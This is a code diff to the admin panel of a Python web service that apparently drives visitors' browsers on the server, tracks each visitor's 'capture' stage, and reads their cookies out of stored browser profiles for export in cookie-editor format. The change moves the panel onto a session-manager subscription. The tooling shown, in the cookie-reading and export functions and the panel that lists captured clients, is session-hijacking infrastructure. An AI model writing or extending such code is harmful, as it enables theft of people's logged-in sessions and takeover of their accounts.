@@ -15,11 +15,17 @@ what each one is doing, and where its browser is. It does not make anything
 up, and a session that has gone is still listed, so that the panel says what
 happened rather than what is happening.
 
-The panel listens. It opens one line to the server and the server pushes to
-it whenever something changes - a client connects, a client goes, a client
-moves to the next step, a browser shows something new. The panel does not
-ask the server the same question every two seconds to find out what it
-already knows.
+The panel does not keep a list of the clients, and it does not reach into
+the server for one. The session manager (sessions.py) is the list: every
+client comes through it, and it says what changed. The panel is a
+subscriber, and what it shows is what the manager told it - a client
+connected, a client went, a client moved to the next step, a browser showed
+something new.
+
+The panel then passes it on. A browser tab that is watching the panel holds
+one WebSocket to the server, and the server writes to it whenever the
+manager has something to say. The panel does not ask the server the same
+question every two seconds to find out what the panel has already been told.
 """
 
 import asyncio
@@ -31,6 +37,8 @@ from pathlib import Path
 
 from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import FileResponse, JSONResponse
+
+import sessions
 
 HERE = Path(__file__).parent
 
@@ -58,8 +66,14 @@ EVENT_LIMIT = 200
 EVENTS: list[dict] = []
 
 # The panels that are listening. The server pushes to these when something
-# changes, so the panel does not have to ask.
+# changes, so the panel does not have to ask. They listen to the panel, and
+# the panel listens to the session manager: one line of telling, all the way
+# down.
 LISTENERS: set = set()
+
+# The manager every client comes through. The panel subscribes to it at the
+# bottom of this file, once it has somewhere to put what it hears.
+MANAGER = sessions.MANAGER
 
 
 # --------------------------------------------------------------------------
@@ -196,8 +210,73 @@ def note(event: str, **fields) -> None:
     push()
 
 
+def state_message() -> dict:
+    """What the panel shows, in the shape the panel reads.
+
+    It is built from the session manager and nothing else - the same list
+    the manager holds, with the same revision on it - so two panels looking
+    at the same server are looking at the same clients.
+    """
+    rows = client_list()
+    return {
+        "t": "state",
+        # Every picture the manager has ever said has a number, and the
+        # numbers only go up. A panel that has been away can therefore tell
+        # that a picture is older than the one it is showing, and not draw
+        # itself backwards.
+        "revision": MANAGER.revision,
+        "clients": rows,
+        "events": events(),
+        "counts": counts(rows),
+    }
+
+
+def counts(rows=None) -> dict:
+    """How many clients there are, and how many of them are here."""
+    rows = client_list() if rows is None else rows
+    return {
+        # Everybody the manager knows about, here or gone.
+        "total": len(rows),
+        # The sessions the manager is holding right now: connected.
+        "live": sum(1 for row in rows if row.get("live")),
+        # Somebody is looking at the capture right now.
+        "here": sum(1 for row in rows if row.get("here")),
+        # Their browser is open, whether or not they are watching.
+        "online": sum(1 for row in rows if row.get("browser_open")),
+        # They have gone: the browser was closed and they left.
+        "gone": sum(1 for row in rows if not row.get("known")),
+        "viewers": sum(row.get("viewers", 0) for row in rows),
+        "finished": sum(1 for row in rows if row.get("finished")),
+        "errors": sum(1 for row in rows if row.get("status") == "error"),
+    }
+
+
+def heard(event: dict) -> None:
+    """The session manager said something.
+
+    This is the whole subscription: every client that comes through the
+    manager arrives here. A session coming or going is a line in the feed
+    as well as a redraw; a session whose browser moved is only a redraw -
+    the panel is told, and it draws what the manager holds now.
+    """
+    kind = event.get("kind")
+    sid = event.get("session") or ""
+    if kind == "connected":
+        note("connected", session=sid)
+    elif kind == "back":
+        note("back", session=sid)
+    elif kind == "gone":
+        note("gone", session=sid)
+    elif kind == "finished":
+        note("finished", session=sid)
+    elif kind == "error":
+        note("error", session=sid, said=event.get("error") or "")
+    else:
+        push()
+
+
 def push() -> None:
-    """Tell every listening panel what the server knows now.
+    """Tell every listening panel what the manager knows now.
 
     The panel asked to be told, so this is the answer. It goes to all of
     them: they all want the same thing, and the list is the same for all.
@@ -206,7 +285,7 @@ def push() -> None:
     if not LISTENERS:
         return
     expected = STORE.token()
-    message = {"t": "state", "clients": client_list(), "events": events()}
+    message = state_message()
     for listener in list(LISTENERS):
         # A line that was let in with a secret that is no longer the
         # secret does not get to keep listening.
@@ -331,17 +410,6 @@ class PanelListener:
             pass
 
 
-def _server():
-    """The server this panel watches.
-
-    It is imported here and not at the top: the server is what mounts the
-    panel, so importing it while it is still being loaded would be asking
-    for a module that is not there yet.
-    """
-    import server
-    return server
-
-
 def stage_of(session) -> str:
     """Where this session is, said the way a person would say it."""
     if session.hub.finished:
@@ -364,6 +432,11 @@ def client_row(session, store: Store) -> dict:
     viewers = len(session.hub.viewers)
     return {
         "id": session.id,
+        # The manager is holding this session right now: the client is
+        # connected. It is said separately from "online", because a client
+        # who has just opened the app is connected before their browser is
+        # up - and the panel should say that, not "idle".
+        "live": True,
         # Online means the server is driving this client's browser right
         # now. That is what "online" means here, and it is the difference
         # between a client the panel can watch and one it can only read.
@@ -402,6 +475,7 @@ def gone_row(sid: str, record: dict, store: Store) -> dict:
     idle = max(0.0, time.time() - seen) if isinstance(seen, (int, float)) else 0.0
     return {
         "id": sid,
+        "live": False,
         "online": False,
         "status": "gone",
         "stage": record.get("stage", "—") if record else "Unknown",
@@ -434,12 +508,16 @@ def every_client(store: Store) -> list[dict]:
     the panel can still read them.
 
     So both are listed, and the panel says which is which.
+
+    The list itself comes from the session manager, and from nothing else:
+    the sessions it is holding, the visitors it remembers putting away,
+    and the profiles on disk it has not met yet. There is no second list
+    for the panel to disagree with.
     """
-    server = _server()
-    rows = [client_row(session, store) for session in server.SESSIONS.values()]
+    rows = [client_row(session, store) for session in MANAGER.values()]
 
     seen = {row["id"] for row in rows}
-    for sid, record in getattr(server, "GONE", {}).items():
+    for sid, record in MANAGER.gone.items():
         if sid not in seen:
             rows.append(gone_row(sid, record, store))
             seen.add(sid)
@@ -448,20 +526,15 @@ def every_client(store: Store) -> list[dict]:
     # profile is on disk from an earlier run. They are still clients -
     # their cookies are in that folder - so they are on the list, and the
     # panel can open their profile and read them.
-    try:
-        for folder in sorted(server.PROFILES.iterdir()):
-            if not folder.is_dir() or folder.name in seen:
-                continue
-            if not server.SESSION_ID.match(folder.name):
-                continue
-            rows.append(offline_row(folder.name, store))
-            seen.add(folder.name)
-    except Exception:
-        pass
+    for sid in MANAGER.on_disk():
+        if sid in seen:
+            continue
+        rows.append(offline_row(sid, store))
+        seen.add(sid)
 
-    # The ones who are here come first, and among them the ones whose
-    # browser is running come before the ones whose browser is shut.
-    rows.sort(key=lambda row: (not row["online"],
+    # The ones the manager is holding come before the ones it remembers,
+    # and among those the ones whose browser is running come first.
+    rows.sort(key=lambda row: (not row["live"],
                                 not row["browser_open"],
                                 row["idle_seconds"]))
     return rows
@@ -480,10 +553,10 @@ def offline_row(sid: str, store: Store) -> dict:
     can open it and read them, and it is not open now, so the panel cannot
     say where their browser is - only what they got to last time.
     """
-    server = _server()
-    profile = server.PROFILES / sid
+    profile = MANAGER.profile(sid)
     return {
         "id": sid,
+        "live": False,
         "status": "offline",
         "stage": "Offline",
         "page": "",
@@ -549,7 +622,6 @@ def build_router() -> APIRouter:
 
     @router.post("/api/login")
     async def login(request: Request):
-        server = _server()
         body = await _body(request)
         given = str(body.get("token") or "")
         expected = STORE.token()
@@ -585,11 +657,11 @@ def build_router() -> APIRouter:
     async def panel_socket(websocket: WebSocket):
         """The panel's line to the server.
 
-        The panel asks to be told what the server knows, and the server
-        tells it: when a client connects, when a client goes, when a client
-        moves to the next step, when a browser shows something new. The
-        panel does not ask the same question over and over to find out what
-        the server already knows.
+        A browser tab that is watching the panel holds this line, and the
+        server writes on it whenever the session manager says something:
+        a client connected, a client went, a client moved to the next step,
+        a browser showed something new. The panel does not ask the same
+        question over and over to find out what the server already knows.
 
         The secret is asked for first. A line that is not let in is
         closed, and nothing is said on it.
@@ -610,11 +682,9 @@ def build_router() -> APIRouter:
         listener = PanelListener(websocket, str(given))
         LISTENERS.add(listener)
         try:
-            # What the server knows right now, so the panel does not have
-            # to wait for the next thing to happen to find out.
-            listener.put_nowait({"t": "state",
-                                 "clients": client_list(),
-                                 "events": events()})
+            # What the manager knows right now, so the panel does not
+            # have to wait for the next thing to happen to find out.
+            listener.put_nowait(state_message())
             while True:
                 # The panel has nothing to say - it only listens. But the
                 # connection has to be read from, so that a closed one is
@@ -635,21 +705,13 @@ def build_router() -> APIRouter:
             return _denied("the admin's secret is needed")
         rows = every_client(store)
         return {
+            "revision": MANAGER.revision,
             "clients": rows,
             "events": events(),
-            "counts": {
-                # Everybody the server knows about, here or gone.
-                "total": len(rows),
-                # Somebody is looking at the capture right now.
-                "here": sum(1 for row in rows if row["here"]),
-                # Their browser is open, whether or not they are watching.
-                "active": sum(1 for row in rows if row["browser_open"]),
-                # They have gone: the browser was closed and they left.
-                "gone": sum(1 for row in rows if not row["known"]),
-                "viewers": sum(row["viewers"] for row in rows),
-                "finished": sum(1 for row in rows if row["finished"]),
-                "errors": sum(1 for row in rows if row["status"] == "error"),
-            },
+            # The counts are the same ones the panel is pushed, worked out
+            # by the same function, so a panel that asks and a panel that
+            # is told cannot disagree about how many clients there are.
+            "counts": counts(rows),
         }
 
     # -- Telegram ---------------------------------------------------------
@@ -718,9 +780,8 @@ def build_router() -> APIRouter:
         store = STORE
         if not _authed(request, store):
             return _denied("the admin's secret is needed")
-        server = _server()
-        sid = server.visitor_of(request)
-        session = server.session_lookup(sid)
+        sid = sessions.visitor_of(request)
+        session = MANAGER.lookup(sid)
         if session is None:
             return _denied("this browser has no session of its own yet",
                            status=404)
@@ -738,15 +799,14 @@ def build_router() -> APIRouter:
         store = STORE
         if not _authed(request, store):
             return _denied("the admin's secret is needed")
-        server = _server()
         if not known_client(sid):
             return _denied("there is no such client", status=404)
-        if not store.export_allowed(sid) and server.visitor_of(request) != sid:
+        if not store.export_allowed(sid) and sessions.visitor_of(request) != sid:
             return _denied("this client has not been allowed to be exported")
         cookies = await cookies_of(sid)
+        here = MANAGER.get(sid)
         return {"session": sid, "cookies": cookie_editor(cookies),
-                "online": bool(server.SESSIONS.get(sid)
-                               and server.SESSIONS[sid].state.get("browser_open"))}
+                "online": bool(here and here.state.get("browser_open"))}
 
     @router.post("/api/clients/{sid}/export")
     async def allow_export(sid: str, request: Request):
@@ -808,14 +868,13 @@ async def cookies_of(sid: str) -> list[dict]:
     the record of that client, and are used when the folder cannot be
     opened - which is the case when the browser is still holding it.
     """
-    server = _server()
-    session = server.SESSIONS.get(sid)
+    session = MANAGER.get(sid)
     if session is not None:
         cookies = await _cookies_of(session)
         if cookies:
             return cookies
 
-    record = getattr(server, "GONE", {}).get(sid) or {}
+    record = MANAGER.gone.get(sid) or {}
     kept = record.get("cookies")
     if isinstance(kept, list) and kept:
         return kept
@@ -831,10 +890,9 @@ async def read_profile_cookies(sid: str) -> list[dict]:
     visitor's own browser uses, so the cookies in it are the cookies that
     browser had.
     """
-    server = _server()
-    if not server.SESSION_ID.match(sid or ""):
+    if not sessions.SESSION_ID.match(sid or ""):
         return []
-    folder = server.PROFILES / sid
+    folder = MANAGER.profile(sid)
     if not folder.is_dir():
         return []
 
@@ -871,9 +929,16 @@ def known_client(sid: str) -> bool:
     is something real to be done with it - their cookies can be read out
     of it.
     """
-    server = _server()
-    if sid in server.SESSIONS or sid in getattr(server, "GONE", {}):
-        return True
-    if not server.SESSION_ID.match(sid or ""):
-        return False
-    return (server.PROFILES / sid).is_dir()
+    return MANAGER.knows(sid)
+
+
+# --------------------------------------------------------------------------
+# The panel listens
+# --------------------------------------------------------------------------
+#
+# This is the subscription. The manager does not know what a panel is, and
+# the panel does not ask the manager for a list: it is told, once, that
+# there is something to hear. Everything a thing needs to be said - the
+# store, the event log, the line to the panel - is defined above, which is
+# why the subscription is made here and not at the top.
+MANAGER.subscribe(heard)
